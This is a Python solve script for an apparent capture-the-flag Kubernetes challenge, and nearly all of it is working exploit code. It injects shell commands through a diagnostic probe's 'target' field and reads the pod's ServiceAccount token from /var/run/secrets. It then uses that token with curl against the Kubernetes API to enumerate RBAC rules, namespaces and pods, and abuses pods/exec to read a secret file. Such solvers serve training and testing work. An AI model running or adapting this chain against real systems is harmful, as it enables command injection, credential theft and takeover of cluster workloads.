#!/usr/bin/env python3
"""
Clean-Room Automated Solve Script for D30 — Internal Kubernetes
Exploits the diagnostic probe command injection to extract the in-cluster
ServiceAccount token, queries the mock Kubernetes RBAC engine, discovers
the over-broad 'pods/exec' create permission in 'orbital-defense', and executes
into the target controller pod to extract the flag.
"""

import sys
import json
import argparse
import urllib.request
import urllib.error
import ssl

def run_probe_command(base_url, command):
    """Executes a command on the challenge container via the diagnostic probe vulnerability."""
    endpoint = f"{base_url.rstrip('/')}/api/v1/diagnostics/probe"
    payload = {
        "probe_type": "ping",
        "target": f"127.0.0.1; {command}"
    }
    data = json.dumps(payload).encode('utf-8')
    req = urllib.request.Request(
        endpoint,
        data=data,
        headers={"Content-Type": "application/json"}
    )
    
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            res_json = json.loads(response.read().decode('utf-8'))
            return res_json.get("output", "")
    except urllib.error.HTTPError as e:
        body = e.read().decode('utf-8', errors='ignore')
        try:
            res_json = json.loads(body)
            return res_json.get("output", "")
        except Exception:
            return body
    except Exception as e:
        print(f"[-] Request failed: {e}")
        return ""

def solve(base_url):
    print(f"[+] Starting D30 solve against {base_url}...")

    # Step 1: Verify Initial Foothold
    print("[1] Probing target for command execution foothold...")
    id_out = run_probe_command(base_url, "id")
    if not id_out or "uid=" not in id_out:
        print(f"[-] Initial command injection failed. Output: {id_out}")
        return False
    print(f"[+] Initial foothold established:\n    {id_out.strip()}")

    # Step 2: Extract ServiceAccount Credentials
    print("[2] Locating in-cluster ServiceAccount token & namespace...")
    sa_cmd = "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace && echo '---' && cat /var/run/secrets/kubernetes.io/serviceaccount/token"
    sa_out = run_probe_command(base_url, sa_cmd)
    
    if "---" not in sa_out:
        print(f"[-] Failed to read service account credentials: {sa_out}")
        return False
    
    parts = sa_out.strip().split("---")
    namespace = parts[0].strip()
    token = parts[1].strip()
    
    print(f"[+] Discovered Service Account Context:")
    print(f"    Namespace: {namespace}")
    print(f"    Token:     {token[:16]}...{token[-8:]}")

    # Step 3: Inspect RBAC Permissions
    print("[3] Performing RBAC SelfSubjectRulesReview across namespaces...")
    # Check default/telemetry permissions
    rbac_cmd_telemetry = f"curl -k -s -X POST https://127.0.0.1:6443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews -H 'Authorization: Bearer {token}' -H 'Content-Type: application/json' -d '{{\"spec\": {{\"namespace\": \"telemetry-system\"}}}}'"
    rules_telemetry = run_probe_command(base_url, rbac_cmd_telemetry)
    print(f"[+] RBAC rules in 'telemetry-system':")
    try:
        t_json = json.loads(rules_telemetry)
        print(json.dumps(t_json.get("status", {}).get("resourceRules", []), indent=6))
    except Exception:
        print(rules_telemetry)

    # Enumerate Namespaces
    print("[4] Enumerating cluster namespaces...")
    ns_cmd = f"curl -k -s https://127.0.0.1:6443/api/v1/namespaces -H 'Authorization: Bearer {token}'"
    ns_out = run_probe_command(base_url, ns_cmd)
    try:
        ns_json = json.loads(ns_out)
        namespaces = [item["metadata"]["name"] for item in ns_json.get("items", [])]
        print(f"[+] Found namespaces: {namespaces}")
    except Exception:
        print(f"[-] Namespace query raw: {ns_out}")
        namespaces = ["orbital-defense"]

    # Check RBAC in 'orbital-defense'
    print("[5] Auditing RBAC permissions in target namespace 'orbital-defense'...")
    rbac_cmd_orbital = f"curl -k -s -X POST https://127.0.0.1:6443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews -H 'Authorization: Bearer {token}' -H 'Content-Type: application/json' -d '{{\"spec\": {{\"namespace\": \"orbital-defense\"}}}}'"
    rules_orbital = run_probe_command(base_url, rbac_cmd_orbital)
    print(f"[+] Discovered over-broad permissions in 'orbital-defense':")
    try:
        o_json = json.loads(rules_orbital)
        rules = o_json.get("status", {}).get("resourceRules", [])
        print(json.dumps(rules, indent=6))
        
        has_exec = any("pods/exec" in r.get("resources", []) and "create" in r.get("verbs", []) for r in rules)
        if has_exec:
            print("[+] CONFIRMED: ServiceAccount has 'create' privilege on 'pods/exec' in 'orbital-defense' namespace!")
    except Exception:
        print(rules_orbital)

    # Step 4: Enumerate Pods in 'orbital-defense'
    print("[6] Listing pods in 'orbital-defense' namespace...")
    pods_cmd = f"curl -k -s https://127.0.0.1:6443/api/v1/namespaces/orbital-defense/pods -H 'Authorization: Bearer {token}'"
    pods_out = run_probe_command(base_url, pods_cmd)
    target_pod = "doombot-defense-controller-0"
    try:
        p_json = json.loads(pods_out)
        pod_names = [p["metadata"]["name"] for p in p_json.get("items", [])]
        print(f"[+] Pods in 'orbital-defense': {pod_names}")
        if pod_names:
            target_pod = pod_names[0]
    except Exception:
        print(f"[-] Pod query raw: {pods_out}")

    # Step 5: Execute Pod Exec to Capture Flag
    print(f"[7] Exploiting 'pods/exec' on '{target_pod}' to retrieve flag...")
    exec_cmd = f"curl -k -s -X POST 'https://127.0.0.1:6443/api/v1/namespaces/orbital-defense/pods/{target_pod}/exec?command=cat&command=/var/run/secrets/latveria.io/defense_flag.txt' -H 'Authorization: Bearer {token}'"
    flag_out = run_probe_command(base_url, exec_cmd)

    print("\n" + "="*70)
    print(f"[+] Pod Exec Result Output:\n{flag_out.strip()}")
    print("="*70)

    import re
    flag_match = re.search(r"(DOOM\{[^\}]+\}|FLAG\{[^\}]+\})", flag_out)
    if flag_match:
        found_flag = flag_match.group(1)
        print(f"\n[SUCCESS] Extracted Flag: {found_flag}\n")
        return found_flag
    else:
        print("[-] Flag pattern not found in output.")
        return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="D30 — Internal Kubernetes Exploit Solver")
    parser.add_argument("--url", default="http://127.0.0.1:8080", help="Target base URL (default: http://127.0.0.1:8080)")
    parser.add_argument("--host", default=None, help="Target host")
    parser.add_argument("--port", default=None, help="Target port")

    args = parser.parse_args()
    target_url = args.url
    if args.host:
        port_str = f":{args.port}" if args.port else ""
        target_url = f"http://{args.host}{port_str}"

    flag = solve(target_url)
    if flag:
        sys.exit(0)
    else:
        sys.exit(1)
